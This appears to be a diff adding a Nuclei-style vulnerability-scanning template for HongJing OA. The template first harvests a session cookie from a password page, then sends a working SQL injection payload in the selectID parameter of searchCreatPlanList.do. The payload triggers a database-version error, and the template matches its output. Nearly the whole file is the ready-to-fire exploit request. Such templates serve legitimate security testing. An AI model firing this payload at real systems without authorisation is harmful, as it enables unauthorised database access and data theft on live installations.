@@ -1,0 +1,47 @@
+id: HongJing-searchCreatPlanList-SqlInjection
+
+info:
+  name: HongJing OA searchCreatPlanList SQL Injection
+  author: iSee857
+  severity: High
+  description: |
+    HongJing OA searchCreatPlanList SQL Injection
+  reference:
+    - https://github.com/iSee857
+  tags: oa,sqli,hongjing
+
+http:
+  - raw:
+      - |
+        GET /templates/index/getpassword.jsp HTTP/1.1
+        Host: {{Host}}
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    extractors:
+      - type: regex
+        name: hongjing_cookie
+        part: header
+        internal: true
+        group: 1
+        regex:
+          - 'Set-Cookie:\s*JSESSIONID=([^;]+);'  
+
+  - raw:
+      - |
+        GET /train/plan/searchCreatPlanList.do?b_selectPlan=query&selectID=1'%2B(1-@@VERSION)%2B')--+ HTTP/1.1
+        Host: {{Host}}
+        Cookie: JSESSIONID={{hongjing_cookie}}
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "数据类型"
